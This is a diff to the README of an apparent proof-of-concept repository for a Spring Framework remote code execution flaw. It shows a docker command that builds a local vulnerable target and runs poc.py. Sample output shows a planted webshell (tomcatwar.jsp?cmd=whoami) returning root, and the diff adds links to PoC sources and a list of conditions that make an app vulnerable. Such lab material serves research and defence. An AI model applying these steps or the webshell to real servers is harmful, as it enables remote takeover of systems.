@@ -3,6 +3,7 @@ Trial & error:
 docker rm -f rce; docker build -t rce:latest . && docker run -d -p 8080:8080 --name rce rce:latest && sleep 5 && python poc.py
 ```
 
+
 Output example:
 ```
 rce
@@ -18,6 +19,18 @@ webshell http://localhost:8080/tomcatwar.jsp?cmd=whoami
 root
 ```
 
+
 Sources:
-  - https://twitter.com/vxunderground/status/1509170582469943303
+  - https://twitter.com/vxunderground/status/1509170582469943303 / https://github.com/craig/SpringCore0day
   - https://github.com/fengguangbin/spring-rce-war
+
+
+Vulnerable app requirements[^1]:
+- JDK 9 or above
+- Standalone Tomcat (no Embedded Tomcat)
+- Any Spring version
+- No blocklist on WebDataBinder / InitBinder
+- Parameter bind with POJOs directly (no @RequestBody, @RequestQuery, etc.)
+- Writeable file system (e.g webapps/ROOT)
+
+[^1]: Assuming exploits similar to the known PoCs. There might be other gadgets...
